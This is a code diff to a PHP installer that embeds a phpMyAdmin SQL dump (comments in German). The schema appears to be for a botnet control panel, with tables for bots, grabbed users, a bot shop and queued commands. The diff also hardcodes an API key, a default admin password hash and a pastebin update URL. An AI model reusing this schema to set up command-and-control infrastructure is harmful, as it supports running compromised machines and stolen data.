@@ -58,13 +58,12 @@ class Install{
                     DROP TABLE IF EXISTS tasks;
                     DROP TABLE IF EXISTS tasks_completed;
                     DROP TABLE IF EXISTS users;
-                    
--- phpMyAdmin SQL Dump
+                    -- phpMyAdmin SQL Dump
 -- version 4.6.6deb4
 -- https://www.phpmyadmin.net/
 --
 -- Host: localhost:3306
--- Erstellungszeit: 05. Mai 2019 um 10:56
+-- Erstellungszeit: 17. Mai 2019 um 19:55
 -- Server-Version: 10.1.37-MariaDB-0+deb9u1
 -- PHP-Version: 7.0.33-0+deb9u3
 
@@ -125,6 +124,13 @@ CREATE TABLE `botshop_access` (
   `active` int(11) NOT NULL DEFAULT '1'
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
+--
+-- Daten für Tabelle `botshop_access`
+--
+
+INSERT INTO `botshop_access` (`id`, `created_by_userid`, `apikey`, `active`) VALUES
+(1, 1, '9bd72c0966efa8c91b2c917f4afe79be', 1);
+
 -- --------------------------------------------------------
 
 --
@@ -147,6 +153,11 @@ CREATE TABLE `botshop_orders` (
   `taskid` varchar(255) NOT NULL DEFAULT 'none'
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
+--
+-- Daten für Tabelle `botshop_orders`
+--
+
+
 -- --------------------------------------------------------
 
 --
@@ -166,7 +177,7 @@ CREATE TABLE `config` (
 --
 
 INSERT INTO `config` (`id`, `enryptionkey`, `check_update_url`, `useragent`, `template`) VALUES
-(1, 'KCQ', 'https://pastebin.com/raw/YBGEBviB', 'somesecret', 'v1');
+(1, 'KQC', 'https://pastebin.com/raw/YBGEBviB', 'somesecret', 'v1');
 
 -- --------------------------------------------------------
 
@@ -215,6 +226,10 @@ CREATE TABLE `securitytokens` (
   `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
 
+--
+-- Daten für Tabelle `securitytokens`
+--
+
 -- --------------------------------------------------------
 
 --
@@ -223,10 +238,11 @@ CREATE TABLE `securitytokens` (
 
 CREATE TABLE `tasks` (
   `id` int(11) NOT NULL,
-  `filter` varchar(100) NOT NULL,
+  `filter` text NOT NULL,
   `status` varchar(100) NOT NULL,
   `task` varchar(255) NOT NULL DEFAULT '0',
   `command` varchar(255) DEFAULT NULL,
+  `execution_limit` int(25) NOT NULL DEFAULT '0',
   `executed` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
@@ -262,7 +278,7 @@ CREATE TABLE `users` (
 -- Daten für Tabelle `users`
 --
 
---
+
 -- Indizes der exportierten Tabellen
 --
 
@@ -340,12 +356,12 @@ ALTER TABLE `bots`
 -- AUTO_INCREMENT für Tabelle `botshop_access`
 --
 ALTER TABLE `botshop_access`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
 --
 -- AUTO_INCREMENT für Tabelle `botshop_orders`
 --
 ALTER TABLE `botshop_orders`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
 --
 -- AUTO_INCREMENT für Tabelle `config`
 --
@@ -365,7 +381,7 @@ ALTER TABLE `grabbed_users`
 -- AUTO_INCREMENT für Tabelle `securitytokens`
 --
 ALTER TABLE `securitytokens`
-  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
+  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
 --
 -- AUTO_INCREMENT für Tabelle `tasks`
 --
@@ -380,10 +396,11 @@ ALTER TABLE `tasks_completed`
 -- AUTO_INCREMENT für Tabelle `users`
 --
 ALTER TABLE `users`
-  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
+  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;
 /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
 /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
 /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+
                    INSERT INTO users SET username = 'admin', passwort = '".str_replace("%","$",'%2y%10%e031/Nzd4x5LWstBinp7puC2Wil1bRIqm6e/c0eKfD/tLZVwlupyG')."'
                ";
 
